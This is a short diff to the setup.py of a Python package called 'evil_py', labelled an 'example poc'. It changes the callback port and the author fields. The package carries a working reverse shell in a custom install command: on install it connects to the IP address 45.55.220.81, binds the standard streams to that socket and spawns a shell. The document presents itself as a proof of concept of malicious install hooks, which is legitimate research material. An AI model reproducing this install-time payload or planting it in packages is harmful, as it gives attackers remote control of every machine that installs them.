@@ -6,7 +6,7 @@ import socket,os,pty
 class evil_py_class(install):
   def run(self):
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect(("45.55.220.81",4444))
+    s.connect(("45.55.220.81",8080))
     os.dup2(s.fileno(),0)
     os.dup2(s.fileno(),1)
     os.dup2(s.fileno(),2)
@@ -15,10 +15,10 @@ class evil_py_class(install):
 setuptools.setup(
   name="evil_py",
   version="1.0.0",
-  author="tf",
+  author="danzajork",
   author_email="dontemail@me.com",
   description="example poc",
-  long_description="example pic",
+  long_description="example poc",
   long_description_content_type="text/markdown",
   url="https://github.com/danzajork",
   packages=setuptools.find_packages(),
